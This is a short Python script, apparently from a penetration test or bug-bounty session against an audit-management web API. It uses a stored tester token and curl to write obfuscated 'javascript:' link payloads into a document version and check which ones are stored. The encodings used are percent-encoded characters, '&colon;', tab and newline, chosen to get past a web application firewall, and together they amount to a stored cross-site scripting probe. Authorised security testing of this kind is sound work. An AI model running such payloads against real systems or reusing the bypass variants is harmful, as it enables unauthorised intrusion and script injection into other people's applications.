import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== does the linkifier decode %63 in href? (setContent -> linkify) ===")
# the narrative view runs: linkify(body) then resolveImageSources then setContent
# check what the linkifier does with percent-encoded scheme
c,b=req('GET','/api/v1/documents/330/diff?from=1371&to=1371')
d=json.loads(b)
print(f"  raw htmldiff: {d.get('htmldiff')!r}")
print()
print("=== try writing body variants that survive WAF, then diff ===")
tag='ZXP'+uuid.uuid4().hex[:5]
variants=[
 ('pct-c',   f'<p><a href="javas%63ript:alert(document.domain)">{tag}</a></p>'),
 ('pct-colon',f'<p><a href="javascript%3aalert(document.domain)">{tag}</a></p>'),
 ('ent-colon',f'<p><a href="javascript&colon;alert(document.domain)">{tag}</a></p>'),
 ('tab',     f'<p><a href="java\tscript:alert(document.domain)">{tag}</a></p>'),
 ('newline', f'<p><a href="java\nscript:alert(document.domain)">{tag}</a></p>'),
]
for label,body in variants:
    c,b=req('PUT','/api/v1/document_versions/1371',{"document_version":{"body":body}})
    if c=='200':
        c2,b2=req('GET','/api/v1/document_versions/1371')
        st=json.loads(b2)['document_versions'][0]
        print(f"  {label:10} PUT=200 stored={str(st.get('body'))[:110]!r}")
    else:
        print(f"  {label:10} PUT={c}")
